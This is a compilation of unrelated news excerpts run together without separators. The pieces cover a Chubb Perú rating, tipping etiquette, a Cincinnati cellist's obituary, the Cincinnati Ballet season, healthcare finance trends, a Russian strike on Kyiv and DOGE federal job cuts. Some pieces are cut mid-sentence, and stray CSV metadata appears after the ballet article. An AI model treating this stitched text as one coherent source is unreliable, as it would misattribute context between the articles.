benefited from previous adjustments in its business offerings, despite dividend payments.   Chubb Perú’s year-end 2024 results reflect a slight increase in claims in contrast to 2023, rendering a combined ratio of 69.8%. The company maintains good profitability metrics, continuing with its strategy to focus on generating value to its business portfolio and limiting exposures to challenging and more competed segments, reflected in its historic net income of USD 9.9 million in 2024.  Chubb Perú benefits from its integration into the Chubb group, gaining operational advantage through the same systems, procedures and ERM practices. The group has demonstrated its support to Chubb Perú by providing a comprehensive reinsurance program with its affiliate and actively overseeing this strategy.   Negative rating actions could occur if AM Best determines that the strategic importance of Chubb Perú to its group has diminished.

I even went to a brewery and overheard another family discussing why they don’t tip at certain places. Do you tip a bartender who gives you a canned drink? Do you only tip the barista after ordering a strawberry matcha latte and leave out the tip for a plain black coffee?The reasoning resides in how much effort is being exerted by both parties. For some, the bill covers the cost of food, and there’s no reason to tip when ordering to-go because there’s no service.Effort is subjective, and you have to decide if the server spilling water on you is the server having a bad day or just a bad server.Personally, I feel the guilt of the world weighs on my shoulders when the iPad turns on me, asking if I want to tip. I assume that businesses aren’t paying their employees enough, and most of it comes from tips, so I always tip. Yet, there’s a frustrating voice in the back of my head yelling the lowest tip option 15%. Some customers start from the top and lower the tip percentage in their head every time something goes wrong, and others start from the bottom and increase the tip percentage every time something goes right. Which person are you? And how do you decide what adds and subtracts from the tip by the time that iPad swings around?These questions are just the tip of the iceberg.

Reading the tributes that are pouring in, it’s clear that he touched many lives, from the students he mentored to the audience members who enjoyed watching this tall, elegant musician, who poured his heart and soul into every piece he played.Over the years, I was privileged to get to know Johns in interviews and conversations over lunch – what he called “breaking bread” together.  He generously told his story to me, of how, as an eager young man in Philadelphia, he loved learning the cello. At 6 foot 5, he was also a talented high school athlete, but he gave up his championship basketball team for a music scholarship. His revered teacher, Philadelphia Orchestra cellist Elsa Hilger, encouraged him to take the job in Cincinnati where he’d be the only musician of color, which was true for the first 25 years of his tenure. She’d been the first female non-harpist in an American orchestra. He recalled her telling him, “It was tough for me, too. I was the only woman. It will be just like that for you, too. But you have to do it.”Over the decades, while major American orchestras were striving to increase their diversity, Johns was quietly making a difference without any fanfare. He taught students at the School for Creative and Performing Arts and throughout the city. He coached the CSO’s Nouveau Chamber Players and Ebony Strings, an ensemble that reminded him of his own all-Black student quartet in Philadelphia.In 2016, he told me the advice he gave to his students: “You have to make your own way, and you have to adhere to the faith that your gift from God is worthy of development, and don’t let anything take you off that path.”He called it “playing it forward.”When the CSO and its Multicultural Awareness Council – MAC – established the Norman E. Johns Chair Award in his honor in 1995, he was “totally shocked.” The scholarship that he sponsored awards full tuition in the Cincinnati Symphony Youth Orchestra to talented high school students of color, who are largely underrepresented in youth orchestras. You could see his unabashed pride when he presented four scholarship awards each year onstage at Music Hall.“He gave his personal time and talent and treasure in making that difference,” said Aurelia “Candie” Simmons, former chair of MAC, who helped launch the scholarship award and raised funds to ensure it continues. “A lot of people give. They put their names on things. But people are going to remember Norm for what he gave of himself. He shared his talents with anyone that was willing to receive them.”In honor of his retirement from the orchestra in May, Johns made his final appearance on Music Hall’s stage. Overcome by emotion, he mopped his eyes as he looked out to see the audience give him a standing ovation. He truly loved music. Over 50 years, his orchestra colleagues, his students and his adopted city had become his family. Thank you, Norman, for sharing your many gifts with all of us.A Community Celebration of Life: Honoring Norman E. Johns, 2-4 p.m., Oct. 5, Springer Auditorium, Music Hall. All are welcome. No RSVP is required. A reception will follow. The program will also be livestreamed on the CSO’s YouTube channel starting at 2 p.m. EST.Janelle Gelfand covers the arts for the Courier.

For him, it’s meaningful.“I'm an immigrant myself. I'm a very proud American citizen,” said the Cuban-born artistic director and former principal dancer. “This country has embraced me, and Cincinnati has embraced me as one of their own. So, having the ability to celebrate this anniversary with Cincinnati Ballet and with our art form was very inspiring for me to curate.”Appointed in December 2024 following a period as interim, Amador is launching a new era – and now he has a new title. Amador is now the Katherine (“Kitty”) and Richard Rosenthal artistic director, thanks to two of Cincinnati Ballet’s devoted patrons.“What Kitty has done for Cincinnati Ballet over the years has been incredible,” he said of the ballet company’s decades-long supporter. “Having them both supporting my role in this company is truly an honor.”Cincinnati Ballet’s season will kick off Sept. 12-20, with the Kaplan New Works Series, presenting four world premieres. In November, a lavish production of “The Great Gatsby” by celebrated choreographer Septime Webre will celebrate 1920s Americana. And for the spring finale, “Liberty in Motion,” Amador has curated American works in honor of the 250th anniversary of America’s signing of the Declaration of Independence.Amador was speaking late last month in his office at the spacious Margaret and Michael Valentine Center for Dance. He’d been popping in and out of the surrounding studios, where dancers and choreographers were creating four new commissions to be performed in the Jarson-Kaplan Theater at the Aronoff Center. At that moment, they were still works in progress.“I am already so impressed with their work,” he said. “It’s thrilling to not quite know yet what it is going to be that they’re creating. The Cincinnati audience is going to be the first in the world to see this product.”expandCervilio Amador is the new interim artistic director for Cincinnati BalletCorrie Schaffeld | CBCThe Kaplan New Works Series is a unique collaboration, where the creation happens between the choreographer and the dancers. Not wanting to restrict their creativity, Amador only gave them a broad theme: to explore human emotions.“The choreographers come with a vision and with their style, but it’s very much a collaboration aspect when you are in the studio with the dancers,” Amador said. “You see the movement coming to life, and you see that interaction between the dancers and the choreographer and the music. The dancers bring so much to the work that it becomes a blend that, for me, is really beautiful to see.”The artist-choreographers have international backgrounds, he said. He ticked them off: Andonis Foniadakis was born on the island of Crete in Greece. Yoshihisa Arai, who is Japanese, is a rehearsal director and also director of Cincinnati Ballet’s Second Company (CB2). Andrea Giselle Schermoly, who is resident choreographer for Louisville Ballet, is from South Africa, and Los Angeles-based dancer and choreographer Caroline Dahm is American.expandHibiki Tsukamoto of the corps de ballet rehearses.Cincinnati BalletWhat they have in common is their athleticism, which will combine with the “incredible physicality” of Cincinnati Ballet’s dancers to showcase what they can do, he said.“There is no limit, and these choreographers offer that through their work. I’m excited to see our dancers interpreting this,” he said.Cincinnati Ballet has always been versatile, able to adjust from style to style. Immediately after New Works, the company will plunge into rehearsals for a completely different style of dance in the jazz age “Gatsby,” Nov. 7-15 at the Aronoff Center. It is based on F. Scott Fitzgerald’s great American novel of 1925.Cincinnati Ballet will be presenting the North American premiere of Webre’s production created for Hong Kong Ballet, where he is artistic director. The opulent production will be traveling to Cincinnati in three large containers and promises plenty of dazzle. Officials did not want to disclose its cost, saying only that it is “pricey.” Cincinnati Ballet has partnered with three other companies to split the cost of its designers, choreographers, stagers and extra crew in the theater.Besides the spectacle, the dancers will perform the Roaring Twenties music with a live jazz band, the Blue Syncopators, conducted by Billy Novick, who is also the score’s composer. The show calls for a blues singer, to be performed by local blues icon Mandy Gaines, as well as an actor/narrator and a tap dancer.For the season finale, “Director’s Vision: Liberty in Motion” (April 10-12 at the Aronoff Center), Amador’s vision was to choose choreographers who have influenced the trajectory of the art form in America. George Balanchine’s classic “Serenade” is the first original ballet Balanchine choreographed in America for New York City Ballet. There’s also Justin Peck’s eclectic “Times are Racing” and Claudia Schreier’s neoclassical “First Impulse.”Amador was appointed interim artistic director in 2023, when he had to dive in at the eleventh hour to direct the 60th anniversary season after the sudden departure of his predecessor, Jodie Gates. He had about a month to plan the successive season. That period was purely reactive, he said.“I was reacting and I needed to have answers right away,” he said. Now, since officially being named artistic director, he has time to be “proactive” – to plan and dream and enjoy the energy of this company.  Still, he’s not feeling relaxed.“I don’t think the job will ever be relaxing. I don’t think there’s such a thing,” he said, with a laugh.The Kaplan New Works SeriesWhen: Sept. 12-20 (times vary)Where: Jarson-Kaplan Theater, Aronoff Center for the Arts, downtownTickets and for season information: 513-621-5282, cballet.org Related Articles New artistic director takes reins for ballet's 2025-26 seasonNew artistic director takes reins for ballet's 2025-26 seasonNew CSO maestro talks debut season: PHOTOSNew CSO maestro talks debut season: PHOTOSDr. Darcy Lei of UC Health gets injured dancers back on their toesDr. Darcy Lei of UC Health gets injured dancers back on their toesArtsWave announces results of multimillion-dollar campaign, concertArtsWave announces results of multimillion-dollar campaign, concertFive things you need to know today, and passing the torchFive things you need to know today, and passing the torch",https://www.bizjournals.com/cincinnati/news/2025/09/05/cervilio-amador-launches-new-era-for-cincy-ballet.html,Unknown,2025-09-05 09:00:00,"The article discusses Cervilio Miguel Amador's first season as artistic director of the Cincinnati Ballet, highlighting the launch of the Kaplan New Works Series.

CommerceHealthcare® has identified key mid-year developments that are influencing strategic decision-making across the sector. The year to date can be characterized by the following:Fresh uncertainties and persistent “structural” issues cloud the industry’s generally improving financial health.There is ongoing commitment to automation and technology investment.Patient affordability pressures fuel the need for financial assistance programs.Migration from status quo operational models to substantially new ones is paramount.FINANCIAL UPDATE.A scan of leading metrics reveals both the progress and the prevailing challenges:Profitability. Through April, hospital margins are running near or above 3% versus the mid-1% range throughout 2024. [1] Smaller hospitals continue to struggle in 2025, as do physician groups. The median investment (loss) per physician full-time equivalent stands at an annualized $347,240 — a 4.8% increase compared to 2024, and a 16.3% jump from 2023.” [2]Revenue/volume. Larger hospitals experienced 24 consecutive months of year-over-year (YOY) growth through April in gross operating, inpatient and outpatient revenues.Cash. Days cash on hand varies widely across health systems.Several ongoing structural impediments to financial health loom large for the second half of the year.1: Government funding cuts.The proposed Medicaid changes being debated in Congress are a major concern. While not in the purview of this report to predict outcomes, it’s helpful to remember these changes also come on top of additional funding cuts — the expiring Affordable Care Act subsidies starting in 2026, and reduced research grants.2: Unfavorable cost trends.Increases in several cost categories are proving hard to tame. A notable one is drugs. Clinic spending is projected to grow 11% to 13% in 2025, while hospitals will increase 2% to 4%. [3] Several high-profile initiatives are taking aim at reducing pharmaceutical costs. One is major online pharmacy “disruptors” such as Amazon and Mark Cuban Cost Plus Drug Company. These firms seek to offer patients substantially discounted medications at scale and with high convenience. Another effort is newly-intensified government pressure on pharmaceutical manufacturers to lower prescription drug prices.3: Labor shortages and disruptions.Labor represents another structural problem. Turnover fell in 2024, but the overall hospital rate is still 18.3%. [4] Critical shortages are projected for the next decade or more. The RN shortfall will be almost 208,000 FTEs by 2037. [5] The long-term services workforce will need 950,000 additional people by 2037. [6]4: Facilities projects.Hospital facility construction is taking a larger share of 2025 capital budgets. [7] Physical plants are aging, and forecasters see a looming bed shortage that will need to be addressed.5: The search for growth.Nearly two-thirds of healthcare executives entered this year with a leading priority of developing revenue growth strategies. [8] Telehealth, Hospital at Home (HaH), and mergers and acquisitions top the list.PATIENT FINANCIAL EXPERIENCE UPDATE.Financial strain remains a defining aspect of the patient experience. Affordability concerns continue to intensify, underscoring the importance of expanded payment support and cost transparency:64% expect to pay more for healthcare in 2025. [9]31 million Americans borrowed an estimated $74 billion in the past 12 months to pay for healthcare, and 58% of them assumed debt of $500 or more [10]3.5% is the projected average annual growth rate of per capita out-of-pocket spending from 2025 to 2032. [11]1: Meeting the need with patient financing.The demand for patient financial assistance will stay elevated. Nearly nine in ten hospital websites show available payment plans. [12] The gold standard is a no-interest line of credit for significant amounts and longer terms to accommodate a range of patient scenarios.2: Making the financial journey better.Overall patient financial engagement is improving, but work remains. Surveyed patients still experience care delays due to insurance verification issues (22%) and struggle with medical record or billing information errors (20%). [13] Positively, more are receiving upfront price estimates of service (41%).TECHNOLOGY AND AUTOMATION UPDATE.The intensity of commitment to financial technology is a significant theme. Many finance leaders say they look for a technology product or service to generate revenue that exceeds project launch costs by three times. [14] These technologies are gathering momentum:1: Process automation.The latest CAQH Index identified an $18 billion savings opportunity from fully automating major administrative processes. [15]2: Artificial intelligence.AI, especially generative AI, is clearly top of mind for healthcare leaders. Sixty percent of respondents from provider, payer and pharmaceutical organizations say their AI budgets are growing faster than overall IT spend.3: Digital payments.Healthcare is poised for 21% compound annual growth in credit card and digital payments through 2034. [16]4: The cybersecurity overhang continues.In a poll of healthcare IT executives, 30% ranked cybersecurity their top 2025 priority. Just over half of respondents placed cybersecurity atop the list of healthcare’s business sectors most in need of a digital strategy. [17]5: New vulnerabilities.Generative AI is being deployed to “impersonate clinicians, defeat voice authentication, bypass smart locks and manipulate surveillance systems.” Only 18% of survey respondents have a strategy to mitigate such threats, and 71% aren’t prepared for tactics such as deepfake badge credentials or sensor spoofing. [18]NEW CARE AND BUSINESS MODELS UPDATE.Many believe the industry must radically rethink partnerships, risk-based models and the role of technology.1: Leadership requirements.One talent firm believes today’s growth environment demands “a scientific engineering” mindset from CEOs, who will need “a deeper understanding of healthcare delivery mechanics and technology applications.” [19]2: Retail health partnership potential.This year is witnessing new meaningful partnerships between retail health companies and traditional organizations. Amazon’s One Medical has recently forged new alliances with health systems, and CVS announced a $20 billion, 10-year investment to build an integrated care platform that could include traditional providers.Conclusion.The progress is encouraging on the financial, patient finance, technology and new business model fronts. But as this report’s title underscores, new uncertainties have clouded the 2025 horizon and added risk. Leaders will again be performing a difficult balancing act among many priorities and will be looking to harness exciting technologies to address structural issues and bring about the substantial change everyone seeks.For a more in-depth analysis of mid-year 2025 healthcare financial trends, find our full trends report here.CommerceHealthcare® solutions are provided by Commerce Bank.Sources:[1] Kaufman Hall, “National Hospital Flash Report,” June 2025.[2] Ibid.[3] L.

The Details: Residential buildings were also struck, and at least three people were killed, including an infant, according to Ukrainian officials. The Cabinet of Ministers, which houses the office of the Prime Minister of Ukraine and other ministries, was hit for the first time during the conflict. The building is located near other government buildings, including the parliament and President Zelenskyy’s office.

For Context: Russia’s drone attacks on Ukraine have escalated in recent months. On July 4, it launched 539 drones, and on July 9, it launched 741. Both attacks were the largest drone attacks yet at the time. More recently, President Trump met with Russian President Putin in Alaska to discuss bilateral relations and moving toward an end to the conflict in Ukraine. Last week, Putin met with many heads of state in China, including Chinese President Xi and Indian President Modi, at an annual Eurasian geopolitical summit. During Putin’s visit to China, the two nations signed a long-deliberated, major pipeline deal that will significantly boost Russian gas exports to China.

How The Media Covered It: As of Sunday morning, the story was mostly covered by outlets from the left and center. Outlets across the spectrum framed the government building being hit and the presumed intent of the Russian attack differently. The Telegraph (Lean Right bias) wrote that Russia “bombed” the building, and CNN (Lean Left) said it struck it. Reuters (Center) said the building was set “ablaze” as a result of the attack.

This page will update with the latest actions by the Trump administration and its Elon Musk-led advisory group, the Department of Government Efficiency (DOGE), to scale back federal government spending and programs.

Which departments have been cut? Where are the biggest rollbacks taking place? In which cases has a judge stepped in to block the Trump administration's moves? Find the latest updates below.

As of September 4, the cuts have eliminated roughly 67,749 federal jobs, according to Layoffs.fyi. This was revised down significantly in mid-April. 

An executive order establishing DOGE, which Trump signed on his first day back in office, reformed a different government agency in the process. The order reads, ""The United States Digital Service is hereby publicly renamed as the United States DOGE Service (USDS) and shall be established in the Executive Office of the President."" DOGE is tracking claimed cuts on doge.gov. On Mar. 6, Trump told Cabinet secretaries that they're in charge of cuts, not Musk.

Some of the actions by the Trump administration have been challenged or reversed. Read the latest on these challenges here.

67,749 Federal Jobs Cut

Public ServicesGo ad-freeAbout these ads

According to Layoffs.fyi, DOGE has cut over 67,749 federal jobs. Scroll down to see a list of the departments where roles have been cut.

Details: President Trump signed an executive order on Feb. 11 directing federal agencies to work with DOGE to cut employees and scale back hiring. Over 75,000 have accepted buyouts, and tens of thousands of other roles have been eliminated, per ABC News (Lean Left). On Mar. 4, the Office of Personnel Management revised a memo to state that it's ""not directing agencies to take any specific performance-based actions regarding probationary employees,"" but didn't reverse any firings. Still, some agencies have begun to rescind terminations.

Why? ""You can't have an autonomous federal bureaucracy. You have to have one that's responsive to the people,"" Elon Musk said on Feb. 11. He branded bureaucracy an ""unconstitutional"" fourth branch of government that holds ""more power than any elected representative."" White House deputy chief of staff for policy Stephen Miller said federal workers are ""overwhelmingly left of center"" and that buyouts were ""essential"" for Trump to ""get control of government"". Some Trump officials say the move could save up to $100 billion.

Opposition: The president of the National Treasury Employees Union said Feb. 11 that “the arbitrary firing of thousands of employees across multiple federal agencies outlined in tonight’s executive order would decimate government services critical to the American public.” AFGE, the biggest federal employee union, said the ""arbitrary and capricious"" buyouts violate federal law. Critics say losing many employees at once would significantly disrupt ongoing operations. Some are also expressing concern that foreign adversaries could move to hire some of the more specialized former employees.

Where Have Firings Happened?

Some of the firings include:

Watchdogs: Trump fired Inspectors General (IGs) from 17 different federal agencies on Jan. 24.

Military Branches: The judge advocates general for the Army, Air Force, and Navy were terminated, as was the Chairman of the Joint Chiefs of Staff.

Consumer Financial Protection Bureau: Roughly 200 CFPB workers have been let go. 

Social Security Administration (SSA): The SSA announced plans to fire 7,000 on Feb. 28. 

Internal Revenue Service (IRS): The IRS laid off 6,700 workers on Feb. 20. 

Federal Aviation Administration (FAA): ""Several hundred"" employees were fired on Feb. 17.

Food and Drug Administration: Roughly 20 researchers were reportedly fired over Presidents' Day weekend.

Health agencies: The CDC has shed one-quarter of its employees, with nearly 3,000 employees leaving the agency. At the National Institutes of Health, 1,165 employees were terminated. The Department of Health and Human Services has eliminated over 20,000 jobs.

Department of Defense: More than 5,000 employees have been removed, and another 50-60,000 are expected to be let go.

Department of Energy: Roughly 2,000 probationary workers were fired Feb. 13, according to Politico (Lean Left).

Department of Education: 1,315 workers were fired on March 11, in addition to 572 who accepted separation packages and 63 probationary workers were let go in February.

Department of Housing and Development: Roughly 780 employees have been let go.

Department of Homeland Security: DHS has fired 400 employees. 

Department of Veterans Affairs: More than 2,400 employees have been dismissed as of Feb. 26.

National Park Service and U.S. Forest Service: More than 4,000 employees were fired, most of them new hires.

Environmental Protection Agency: The EPA has fired 388 probationary employees.

NASA: Around 1,000 probationary employees were fired from NASA, and another 750 accepted a deferred resignation, reducing the organization's size by 10%.

National Nuclear Safety Administration: The Trump administration originally planned to fire 300 of the agency’s 1,800 staff, but some are being retained.

General Services Administration: More than 100 people have been laid off.

U.S. Agency for International Development (USAID): More than 4,700 workers were put on leave, and another 1,600 were terminated.

National Oceanic and Atmospheric Administration: Roughly 1,900 employees have been terminated.

U.S. Postal Service: The agency plans to cut 10,000 jobs.

Major VA Restructuring

Public Services

The Latest: The Dept. of Veterans Affairs is on track to eliminate 30,000 employees, down from previous plans to eliminate 80,000. ""The Department of Veterans Affairs would see increased spending under the Trump administration’s budget plan for next year, but is still pursuing workforce cut,"" according to Federal News Network (not rated).

Why? “Our goal is to reduce VA employment levels to 2019 in strength numbers, roughly 398,000 employees, from our current level of approximately 470,000 employees,” VA Secretary Doug Collins said on Mar. 5. “Now that’s a 15 percent decrease. We’re going to accomplish this without making cuts to health care or benefits to veterans and VA beneficiaries.”

Opposition: “Make no mistake, cancelling these contracts will cause harm to veterans and VA care and benefits,” said Sen. Richard Blumenthal (D-CT) in a statement. “And it is completely unacceptable there has been no transparency, accountability, or consultation surrounding these contracts.""

Withholds to Funding for Schools Nationwide

Public Services

The Latest: ""The Trump administration has withheld nearly $7 billion in federal funding that helps pay for after-school and summer programs, support for students learning English, teacher training and other services,"" according to The New York Times (Lean Left).

Why? According to Newsweek (Center), The White House and Education Secretary Linda McMahon have previously signaled their intent to reassess or cut these programs, citing the desire to align funding with the president's education priorities, including opposition to bilingual education and some diversity initiatives.

Opposition: ““Every day that this funding is held up is a day that school districts are forced to worry about whether they’ll have to cut back on after-school programs or lay off teachers instead of worrying about how to make sure our kids can succeed,” Senator Patty Murray, a Democrat who is the vice chairwoman of the Senate Appropriations Committee, said in a statement.

DOGE Moves to Sell Almost Half a Billion In Federal Real Estate

Public Services

The Latest: DOGE is planning to sell off major real estate in Washington, D.C., including several prominent cabinet agencies, to give the U.S. Treasury a boost in cutting the $36 trillion national debt. Current employees would be relocated.

Why? Fox News (Right) cited a Biden-era report that revealed about 7,700 federal offices are vacant, 2,200 are mostly empty, and annual maintenance costs for 277,000 federal buildings exceed $10 billion. It wrote, ""Taxpayers shell out about $81 million to maintain underutilized or unutilized federal offices.""

Opposition: The Associated Press (Left) reported on federal agencies across the country terminating leases in March, saying “Many of the terminations would affect agencies that aren’t as well-known but oversee services critical to many Americans.""

Dept. of Education Faces Rollbacks

Public Services

The Latest: Republicans' spending plan reportedly calls to cut the Education Dept. budget by 15.3%. The department is canceling $1B in federal grants for school mental health services, citing claims that the contracts included DEI requirements.

Why? The Trump administration wants to give individual states more control over and responsibility for their education systems, as part of efforts to cut federal government spending. Some programs have been cut due to “questionable implementation” and purported financial waste.

Opposition: “Stripping the department of its resources and mission would be catastrophic for the millions of students in low-income communities who need educational services and support. Civil rights protections against discrimination based on race, gender, and disability would also be gutted,” the National Education Association said. Twenty-one Attorney Generals have sued the Trump administration for gutting the Department of Education. States like Massachusetts are calling the termination of hundreds of millions of dollars in education grant funding ""illegal"".

Treasury Changes, Data

Economic Regulation

Access to Data: On May 27, US District Judge Jeannette Vargas ruled that DOGE could access the Treasury Department's data on payments and people, saying the Trump administration created a sufficient process to train the DOGE staffers and prevent improper disclosures of private data. In February, Vargas blocked DOGE from accessing Treasury’s payment systems, saying the administration didn't “adequately consider” the risks of allowing the access.

BOI Requirement: The Treasury Department announced it is suspending all enforcement of the Beneficial Ownership Information (BOI) reporting requirement for US citizens, which was a section of the Corporate Transparency Act. President Donald Trump called the ""Biden-era"" rule ""outrageous and invasive"" and "" an absolute disaster for Small Businesses."" Secretary of the Treasury Scott Bessent said they were ""reining in burdensome regulations, particularly for small businesses that are the backbone of the American economy.""

Opposition: Ian Gary, executive director of the Financial Accountability & Corporate Transparency (FACT) Coalition said regarding a previous court ruling that ruled the Corporate Transparency Act unconstitutional: ""This is a pro-crime, pro-drug cartel, pro-fentanyl ruling that undermines the rule of law and allows criminals to use anonymous shell companies to hide their dirty money from law enforcement. Close to a million law-abiding companies have already complied with the law."" DOGE ""has faced several lawsuits over its attempts to access sensitive and classified records at various government agencies, as well as over Musk’s unprecedented influence in the government as a temporary employee of the White House who has not been confirmed or vetted by Congress,"" according to the Washington Post (Lean Left).

Medicaid Cuts, Fraud

Public Services

Why? On May 11, House Republicans released a plan to cut Medicaid spending by $880 billion, including adding work requirements and eligibility checks. An opinion by former Republican Speaker Newt Gingrich and former Republican Rep. Bobby Jindal in Fox News (Right) argued that the bill would make Medicare more affordable and accountable.

The Latest: ‘There’s about $14 billion we’ve identified with DOGE, of folks who are duly enrolled wrongly in multiple states for Medicaid,"" said Mehmet Oz, administrator of the Centers for Medicare & Medicaid Services, in late May.

Opposition: Some Republicans are against the cuts, while others say they don't go far enough. Sen. Josh Hawley (R-MO) joined many Democrats in arguing against Medicaid cuts, saying, “If Congress cuts funding for Medicaid benefits, Missouri workers and their children will lose their health care. And hospitals will close. It’s that simple. And that pattern will replicate in states across the country.” The Wall Street Journal (Center) cast the bill as a ""middle ground"" proposal.

Cutting Gun Regulations

Other

The Latest: DOGE is working with the Bureau of Alcohol, Tobacco, Firearms and Explosives (ATF) general counsel to cut upwards of 50 gun regulations by July 4, according to Washington Post (Lean Left).

Why? The Trump administration wants to slash the agency’s budget and reduce the number of inspectors. “As Attorney General Bondi has made clear, ATF is working hard to reduce regulatory red tape that burdens lawful gun owners and to ensure agents are doing real police work hunting down criminals and gang members — not knocking on the doors of lawful gun owners in the middle of the night,” said Chad Gilmartin, a spokesman for the Justice Department, which oversees ATF.

Opposition: Some gun-control advocates fear that the changes will allow potentially dangerous people to obtain weapons more easily with little recourse.

National Endowment for the Humanities Cuts

Other

The Latest: DOGE said it canceled $163M worth of grants from NEH, including ""$350k for interactive gay travel guides to better understand historical LGBTQ+ spaces.""

Why? Going forward, ""NEH grants will be merit-based and awarded to non-DEI, pro-America causes,"" according to DOGE.

Opposition: ""Critics say the deep cuts to the National Endowment for the Humanities, which has supported research and learning at colleges since 1965, 'will ripple across American life,'"" per Inside Higher Ed.

Canceling Federal Credit Cards

Other

The Latest: Beginning in February 2025, DOGE launched a program to ""audit unused/unneeded credit cards across 32 agencies"" that as of May 30 has resulted in the cancelation of ~523,000 cards. DOGE wrote, ""As a reminder, at the start of the audit, there were ~4.6M active cards/accounts - we are now expanding the program to more agencies, as there is much more work to do.""

Why?: DOGE said it aims to consolidate the number of federal card accounts and reduce administrative costs. President Trump later called for a 30-day freeze on agency employee cards via an executive order.

Opposition: Former DOJ lawyer Jessica Childress told Fortune (Center bias) in March, ""These cards are the ways that many government workers are performing the duties they've taken an oath to perform. It facilitates the ability of these employees to do their jobs.""

Musk’s DOGE Tenure Ends

Other

The Latest: Elon Musk has officially concluded his tenure with Department of Government Efficiency (DOGE) in the Trump administration as his permitted tenure as a special government employee comes to an end.

Musk wrote on X, “As my scheduled time as a Special Government Employee comes to an end, I would like to thank President [Trump] for the opportunity to reduce wasteful spending. The DOGE mission will only strengthen over time as it becomes a way of life throughout the government.”

For Context: Being a special government employee exempts one from certain financial disclosure and conflict-of-interest rules that full-time government workers are subject to, but imposes a work limit of 130 days in a 365-day period.

Police Reform

Public Services

The Latest: On May 22, the Department of Justice (DOJ) said it plans to roll back Biden-era oversight agreements with the police departments in Louisville, Kentucky and Minneapolis, Minnesota and move to dismiss lawsuits brought against each city's department for alleged unconstitutional violations. It also indicated it would be closing investigations into constitutional violations in six other cities that include Phoenix and Memphis.

Why? The DOJ criticised the Biden administration for enacting ""sweeping"" agreements ""that would have imposed years of micromanagement"" of local police departments by federal courts. Harmeet Dhillon, Assistant Attorney General for Civil Rights at the DOJ said the agreements were ""handcuffing"" local police units.

Opposition: The mayors of Louisville and Minneapolis both said they would move forward with reform plans, despite the likely dismissal of the agreements.

Grant Cuts at DOJ

Public Services

The Latest: On May 14, The Daily Wire (Right bias) reported that ""the Department of Justice is taking funds that it formerly granted to groups supporting transgender ideology and diversity, equity, and inclusion initiatives, and using these funds to support United States law enforcement.""

Why? The Justice Department said it was terminating grants that “no longer effectuate the program goals or agency priorities.”

Opposition: Many of the grant programs support crime victims, fight human trafficking, and protect incarcerated youth.

Tribal Libraries Lose Funding

Other

Why? Over a hundred publicly-funded libraries on federally recognized tribal lands were informed by the Institute of Museum and Library Services (IMLS), the agency responsible for funding small libraries and museums nationwide, that grants appropriated to them by Congress had been terminated, according to an IMLS spokesperson.

A letter from the US government to a tribal grant writer obtained by NBC News (Lean Left) read, “IMLS has determined that your grant is unfortunately no longer consistent with the agency’s priorities and no longer serves the interest of the United States and the IMLS Program. IMLS is repurposing its funding allocations in a new direction in furtherance of the President’s agenda.” The letter was signed by Trump-appointed acting director of the IMLS and Deputy Labor Secretary Keith Sonderling.

Opposition: The American Library Association and the American Federation of State, County and Municipal Employees, sued Sonderling, Trump and DOGE last month over the cuts.

The Latest: U.S. District Judge Richard Leon temporarily barred the Trump administration from making more cuts to the IMLS and an injunction granted later in a separate lawsuit from 21 state attorneys general established that the IMLS can't be further downsized.

Library of Congress Shakeups

Other

Why? The Trump administration fired Congress' Librarian Carla Hayden without giving her a reason, though later White House Press Secretary Karoline Leavitt told reporters ""There were quite concerning things that she had done at the Library of Congress in the pursuit of DEI and putting inappropriate books in the library for children."" Hayden, who was nominated by former President Barack Obama and confirmed by the Senate in 2016, was set to finish her term next year. She was the first woman and the first African American to hold the position.

Opposition: Democratic leaders expressed discontent with the move.

The Latest: Shortly after firing Hayden, the Trump administration fired US Copyright Office leader Shira Perlmutter. The Office operates under the Library of Congress.

National Park Funding Cuts

Other

The Details: The Interior Department is reportedly finalizing plans to cut another 1,500 staff from the National Park Service. The Trump administration proposed reducing the budget funding for American public spaces like national parks, monuments, historic sites, seashores and trails from $4.8 billion to $3.6 billion. Many of these would be turned over to the jurisdiction of states, according to USA Today (Lean Left).

The cuts would reportedly include:


	$900 million from park service operations.
	$158 million from historic preservation.
	$77 million to reservation and preservation funding.
	$73 million from national park construction.


Opposition: Theresa Pierno, president and CEO of the nonprofit National Parks Conservation Association said, “This is the most extreme, unrealistic and destructive National Park Service budget a President has ever proposed in the agency’s 109-year history."" Jennifer Rokala, of the self-described ""nonpartisan"" Center for Western Priorities said, ""Handing over national park sites to states is a non-starter. States can’t afford to manage them, so the inevitable outcome is the closure, then privatization of our most treasured public lands.""

IRS Changes

Economic Regulation

The Latest: More than 3,600 agents who collect tax payments have left the agency, according to a watchdog report.

Why? ""President Trump is answering Americans’ fears of a supercharged Internal Revenue Service (IRS) with an executive order halting the hiring of federal employees until his Administration determines that it is in the national interest to do so,"" said a statement from House Ways and Means Committee Chairman Jason Smith (R-MO). ""This includes curtailing the onboarding of tens of thousands new IRS agents called for by Democrats in the so-called Inflation Reduction Act.""

Opposition: ""Yes, more complex audits will decline,"" said an analysis from Kilpinger (not rated). ""But that means the IRS will focus on the low-hanging fruit, exams that agents conduct solely through correspondence. But good luck in getting a reply to correspondence that you send to the IRS, even if your letter is in reply to an IRS notice. Taxpayer assistance will also suffer, including the phone lines.""

Department of Labor Changes

Other

The Latest: On May 6, DOGE said the Dept. of Labor cut ""$13.6M in wasteful DEI grants totaling $8.4M in savings. The Guardian (Left) reported speaking to Department of Labor employees who said 20% (approximately 2,700) employees resigned in light of the Trump administration's recent cuts and buyout offers for government employees. The Guardian elevated perspectives of workers upset with the administration's ""government efficiency"" efforts.

Why? The Heritage Foundation (Right) and other conservative organizations have called for the department to be significantly scaled back.

Opposition: ""A 'catastrophic' exodus of thousands of employees from the US Department of Labor threatens 'all of the core aspects of working life,'"" The Guardian reported.

USDA Cuts $1B in Local Food Programs

Public Services

The Latest: The Latest: On April 29, DOGE said it cut Dept. of Agriculture (USDA) grants ""totaling $2.5B in award value"". Roughly $500 million has been cut from the Local Food Purchase Assistance program (LFPA), and $500 million may also be cut from the Emergency Food Assistance Program (TEFAP).

Why? A USDA spokesperson said “these programs, created under the former Administration via Executive authority, no longer effectuate the goals of the agency.” DOGE has highlighted how some of the money is going toward things like ""$150k for 'gender lensed curricula designed to be transdisciplinary in the food, agriculture, natural resources and human sciences'"" and ""$100k for 'climate resilience and sustainable agriculture in Ghana'.""

